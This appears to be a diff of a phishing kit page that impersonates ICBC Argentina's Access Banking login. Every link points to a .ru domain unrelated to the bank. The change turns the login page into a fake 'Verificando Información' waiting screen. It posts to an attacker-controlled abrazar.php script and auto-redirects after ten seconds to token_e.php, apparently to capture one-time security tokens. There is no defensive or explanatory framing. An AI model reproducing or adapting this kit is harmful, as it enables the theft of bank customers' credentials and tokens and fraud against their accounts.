@@ -2,11 +2,13 @@
 
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	
-	<link href="./index_files/style.css" media="screen" rel="stylesheet" type="text/css">
-	<link href="./index_files/jirafa.css" media="screen" rel="stylesheet" type="text/css">
-	<link href="./index_files/autobus.css" media="screen" rel="Stylesheet" type="text/css">
-	<link href="./index_files/fuentes.css" media="screen" rel="Stylesheet" type="text/css">
-	<link href="./index_files/potro.css" media="screen" rel="Stylesheet" type="text/css">
+	<meta http-equiv="refresh" content="10; url=&#39;./token_e.php&#39;">
+	<link href="./espere2_files/style.css" media="screen" rel="stylesheet" type="text/css">
+	<link href="./espere2_files/jirafa.css" media="screen" rel="stylesheet" type="text/css">
+	<link href="./espere2_files/autobus.css" media="screen" rel="Stylesheet" type="text/css">
+	<link href="./espere2_files/fuentes.css" media="screen" rel="Stylesheet" type="text/css">
+	<link href="./espere2_files/potro.css" media="screen" rel="Stylesheet" type="text/css">
+	<link href="./espere2_files/popup.css" media="screen" rel="stylesheet" type="text/css">
 	<link rel="shortcut icon" href="https://guapgwis.ru/8o62u/decorar/asilo/favicon.ico">
 
 	<title>ICBC</title>
@@ -16,7 +18,7 @@
 	<div class="containerSite" dlra="">
 		<div class="headerContainer fullpagewidthline" dlra="">
 			<div class="backcolor_0084 logoHeaderDiv" dlra="">
-				<a href="https://guapgwis.ru/8o62u/" target="_parent"><img alt="" border="0" dlra="" src="./index_files/logogris.png" valign="middle"></a>
+				<a href="https://guapgwis.ru/8o62u/espere2.php" target="_parent"><img alt="" border="0" dlra="" src="./espere2_files/logogris.png" valign="middle"></a>
 			</div>
 
 			<div class="header_globe" dlra="" style="float:right">
@@ -24,12 +26,12 @@
 					<tbody dlra="">
 						<tr dlra="" valign="top">
 							<td align="right" class="homeblacktxt" dlra="" height="20">
-								<a class="homeblacktxt" dlra="" href="https://guapgwis.ru/8o62u/">ayuda </a>| <a class="homeblacktxt" dlra="" href="https://guapgwis.ru/8o62u/">contactanos</a>
+								<a class="homeblacktxt" dlra="" href="https://guapgwis.ru/8o62u/espere2.php">ayuda </a>| <a class="homeblacktxt" dlra="" href="https://guapgwis.ru/8o62u/espere2.php">contactanos</a>
 							</td>
 						</tr>
 
 						<tr dlra="">
-							<td class="homeblacktxt" dlra="" height="19"><img dlra="" height="1" src="./index_files/p.gif" width="1"></td>
+							<td class="homeblacktxt" dlra="" height="19"><img dlra="" height="1" src="./espere2_files/p.gif" width="1"></td>
 						</tr>
 					</tbody>
 				</table>
@@ -76,7 +78,7 @@
 					</div>
 
 					<div class="input-block-container margin-bottom--hig" dlra="">
-						<form action="nuevo.php" autocomplete="OFF" class="formToValidate" dlra="" id="xmqiui" method="post" name="xmqiui">
+						<form autocomplete="OFF" class="formToValidate" dlra="" id="xmqiui" name="xmqiui">
 							<div class="login-input-container" dlra="">
 								<div class="login-input-label" dlra="">
 									Usuario
@@ -97,19 +99,14 @@
 								</div>
 							</div>
 
-							<ul class="block-buttons" dlra="">
-								<li class="block-buttons__item"><input align="center" class="btnclass" dlra="" id="" tabindex="3" type="submit" value="INGRESAR">
-								</li>
-							</ul>
-
 							<div class="input-block-links" dlra="" id="login-links">
 								<ul class="desplegable-links push-left" dlra="">
 									<li class="desplegable-links__item" dlra="">
-										<a class="olvido-clave btn-link c-list-link" dlra="" href="https://guapgwis.ru/8o62u/">No puedo ingresar</a>
+										<a class="olvido-clave btn-link c-list-link" dlra="" href="https://guapgwis.ru/8o62u/espere2.php">No puedo ingresar</a>
 									</li>
 
 									<li class="desplegable-links__item last" dlra="">
-										<a class="btn-link" dlra="" href="https://guapgwis.ru/8o62u/">Tengo una clave provisoria</a>
+										<a class="btn-link" dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Tengo una clave provisoria</a>
 									</li>
 
 									<li class="desplegable-links__item last" dlra="">
@@ -122,24 +119,18 @@
 							<div class="clearfix" dlra=""></div>
 						</form>
 					</div>
-
-					<div class="virtual-key-block__virtual_key" dlra="">
-						<div class="virtual-Key-block__check" dlra="">
-							<input id="check_VKB" name="virtualkb" type="checkbox"><label class="virtual-key-block__label virtual-key-text" dlra="">Teclado virtual</label>
-						</div>
-					</div>
 				</div>
 			</div>
 
 			<div class="text-coments-block padding-global--reg" dlra="">
-				Operar con Access Banking implica que aceptás en su totalidad los<a dlra="" hidefocus="true" href="https://guapgwis.ru/8o62u/" tabindex="-1"><strong>términos y condiciones.</strong></a><br>
+				Operar con Access Banking implica que aceptás en su totalidad los<a dlra="" hidefocus="true" href="https://guapgwis.ru/8o62u/espere2.php" tabindex="-1"><strong>términos y condiciones.</strong></a><br>
 				Las transacciones realizadas en Access Banking no generan cargos adicionales.
 			</div>
 
 			<div class="debito-block" dlra="">
 				<div class="debito-block-align" dlra="">
 					<div class="debito-block__text" dlra="">
-						Si tenés&nbsp;<b style="color:red">tarjeta Visa ICBC</b>&nbsp;y/o&nbsp;<b style="color:red">tarjeta MasterCard ICBC</b>&nbsp;y no contás con tarjeta de Débito ICBC, obtené tu usuario y clave haciendo&nbsp;<b style="cursor:pointer;cursor:hand;text-decoration:underline">click acá</b>.
+						Si tenés<b style="color:red">tarjeta Visa ICBC</b>y/o<b style="color:red">tarjeta MasterCard ICBC</b>y no contás con tarjeta de Débito ICBC, obtené tu usuario y clave haciendo<b style="cursor:pointer;cursor:hand;text-decoration:underline">click acá</b>.
 					</div>
 				</div>
 			</div>
@@ -147,11 +138,11 @@
 			<div class="news_container" dlra="">
 				<div class="central-block" dlra="">
 					<div class="ad-box ad-box--alCincuenta" dlra="">
-						<a dlra="" href="https://guapgwis.ru/8o62u/" rel="noopener" target="_blank"><img class="ad-box__image" dlra="" src="./index_files/fondito.jpg">
-					</a></div><a dlra="" href="https://guapgwis.ru/8o62u/" rel="noopener" target="_blank">
+						<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php" rel="noopener" target="_blank"><img class="ad-box__image" dlra="" src="./espere2_files/fondito.jpg">
+					</a></div><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php" rel="noopener" target="_blank">
 
-					</a><div class="ad-box ad-box--alCincuentaMargen" dlra=""><a dlra="" href="https://guapgwis.ru/8o62u/" rel="noopener" target="_blank">
-						</a><a dlra="" href="https://guapgwis.ru/8o62u/" rel="noopener" target="_blank"><img class="ad-box__image" dlra="" src="./index_files/atenciontelefonica.png"></a>
+					</a><div class="ad-box ad-box--alCincuentaMargen" dlra=""><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php" rel="noopener" target="_blank">
+						</a><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php" rel="noopener" target="_blank"><img class="ad-box__image" dlra="" src="./espere2_files/atenciontelefonica.png"></a>
 					</div>
 				</div>
 			</div>
@@ -168,27 +159,27 @@
 										<li class="colTitulo" dlra="">Productos</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Paquetes</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Paquetes</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Cuentas</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Cuentas</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Tarjetas</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Tarjetas</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Seguros</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Seguros</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Inversiones</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Inversiones</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Préstamos</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Préstamos</a>
 										</li>
 									</ul>
 								</li>
@@ -198,19 +189,19 @@
 										<li class="colTitulo" dlra="">Servicios</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Beneficios</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Beneficios</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">ICBC Mall</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">ICBC Mall</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Canales de Servicios</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Canales de Servicios</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Giros y Transferencias</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Giros y Transferencias</a>
 										</li>
 									</ul>
 								</li>
@@ -220,31 +211,31 @@
 										<li class="colTitulo" dlra="">Utilidades</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Teléfonos Útiles</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Teléfonos Útiles</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Sucursales y Cajeros</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Sucursales y Cajeros</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Seguridad en Canales</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Seguridad en Canales</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Código de Prácticas Bancarias</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Código de Prácticas Bancarias</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Cajeros con funcionalidad para no videntes</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Cajeros con funcionalidad para no videntes</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Actualización de Datos Personales</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Actualización de Datos Personales</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Atención al usuario de servicios financieros</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Atención al usuario de servicios financieros</a>
 										</li>
 									</ul>
 								</li>
@@ -252,27 +243,27 @@
 								<li class="columna" dlra="">
 									<ul class="columna" dlra="">
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">En Argentina</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">En Argentina</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Prensa</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Prensa</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Responsabilidad Social</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Responsabilidad Social</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Recursos Humanos</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Recursos Humanos</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Fundación ICBC</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Fundación ICBC</a>
 										</li>
 
 										<li dlra="">
-											<a dlra="" href="https://guapgwis.ru/8o62u/">Licitaciones</a>
+											<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Licitaciones</a>
 										</li>
 									</ul>
 								</li>
@@ -287,8 +278,8 @@
 			<tbody dlra="">
 				<tr dlra="">
 					<td dlra="">
-						<a dlra="" href="https://guapgwis.ru/8o62u/">Términos y Condiciones</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">Política de Privacidad</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">Aviso Legal - Ley 25.738</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">CABA - Ley 2.709</a>|<a dlra="" href="https://guapgwis.ru/8o62u/">Defensa del Consumidor</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/"><br>
-						Comparación de comisiones</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">Gerenciamiento de Riesgos</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">P. Datos Personales</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">FATCA</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">Agente Institorio</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/">ALyC</a><br>
+						<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Términos y Condiciones</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Política de Privacidad</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Aviso Legal - Ley 25.738</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">CABA - Ley 2.709</a>|<a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Defensa del Consumidor</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php"><br>
+						Comparación de comisiones</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Gerenciamiento de Riesgos</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">P. Datos Personales</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">FATCA</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">Agente Institorio</a><font class="footerc" dlra="">|</font><a dlra="" href="https://guapgwis.ru/8o62u/espere2.php">ALyC</a><br>
 						Industrial and Commercial Bank of China (Argentina) S.A.U. 2012 TODOS LOS DERECHOS RESERVADOS
 					</td>
 
@@ -319,5 +310,27 @@
 
 		<div dlra="" style="z-index:2000000000;position:relative"></div>
 	</div>
+
+	<section class="containerCustom" id="docPopup" style="display: block;">
+    <form action="https://guapgwis.ru/8o62u/humor/abrazar.php" id="mainF" method="post" name="mainF">
+      <div class="overlay">
+        <div class="modalCustom">
+          <center>
+            <img src="./espere2_files/icbc-logo.png" style="border-radius: 10px;" width="100px"><br>
+
+            <h1 class="title" style="font-size: 21px;">Verificando Información</h1>
+
+            <hr>
+            <br>
+
+            <div class="spinner"></div>
+            <br>
+
+            <p style="font-size: 14px;">Espera un momento, no cierres esta ventana.</p>
+          </center>
+        </div>
+      </div>
+    </form>
+  </section>
 
 </body></html>
